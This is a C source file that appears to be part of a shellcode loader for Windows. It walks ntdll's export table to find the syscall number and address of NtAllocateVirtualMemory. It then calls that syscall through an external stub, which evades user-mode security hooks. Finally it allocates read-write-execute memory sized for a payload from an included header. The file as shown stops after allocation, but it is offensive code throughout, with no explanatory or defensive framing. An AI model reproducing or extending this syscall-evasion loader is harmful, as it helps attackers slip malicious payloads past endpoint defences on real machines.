#include <windows.h>
#include <stdio.h>
#include "Payload.h"

extern DWORD NtAllocateVirtualMemory_SSN;
extern UINT_PTR NtAllocateVirtualMemory_Addr;

extern NTSTATUS NTAPI Sys_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection
);

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)


BOOL GetSyscallInfo( HMODULE hModule, LPCSTR lpFuncName, PDWORD SSN, PUINT_PTR sysAddr ) {

    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )hModule;
    if ( pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid DOS header\n" );
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( PBYTE )hModule + pDosHeader->e_lfanew );
    if ( pNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid NT header\n" );
        return FALSE;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = ( PIMAGE_EXPORT_DIRECTORY )( ( PBYTE )hModule + pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    if ( pExportDirectory->NumberOfNames == 0 ) {
        fprintf( stderr, "[-] No exported functions\n" );
        return FALSE;
    }


    PDWORD pAddresOfNames = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNames );
    PDWORD pAddressOfFunctions = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfFunctions );
    PWORD pAddressOfNameOrdinals = ( PWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < pExportDirectory->NumberOfNames; i++ ) {
        LPCSTR pFunctionName = ( LPCSTR )( ( PBYTE )hModule + pAddresOfNames[ i ] );
        PBYTE pFunctionAddress = ( PBYTE )( ( PBYTE )hModule + pAddressOfFunctions[ pAddressOfNameOrdinals[ i ] ] );

        if ( _stricmp( pFunctionName, lpFuncName ) != 0 ) {
            continue;
        }

        printf( "[+] %s: 0x%p\n", pFunctionName, pFunctionAddress );

        for ( DWORD j = 0; j < 32; j++ ) {
            if ( pFunctionAddress[ j ] == 0x4C
                && pFunctionAddress[ j + 1 ] == 0x8B
                && pFunctionAddress[ j + 2 ] == 0xD1 ) {

                *SSN = *( DWORD* )( pFunctionAddress + j + 4 );
                *sysAddr = ( UINT_PTR )( pFunctionAddress + j );

                printf( "[+] Syscall Number: 0x%x\n", *SSN );
                printf( "[+] Syscall Address: 0x%p\n", ( VOID* )*sysAddr );

                return TRUE;
            }
        }
    }

    return FALSE;

}

int main( void ) {

    HMODULE hNtdll = LoadLibraryA( "ntdll.dll" );
    DWORD SSN = 0;
    UINT_PTR SysAddr;

    if ( !GetSyscallInfo( hNtdll, "NtAllocateVirtualMemory", &SSN, &SysAddr ) ) {
        fprintf( stderr, "[-] Failed to get Syscall/SysAddress.\n" );
        return 1;
    }

    NtAllocateVirtualMemory_SSN = SSN;
    NtAllocateVirtualMemory_Addr = SysAddr;

    NTSTATUS status;
    PVOID baseAddress = NULL;
    SIZE_T regionSize = ( SIZE_T )payloadSize;
    status = Sys_NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] Failed to allocate memory: 0x%X\n", status );
        return 1;
    }

    printf( "[+] Allocated %d bytes at %p\n", payloadSize, baseAddress );

    return 0;
}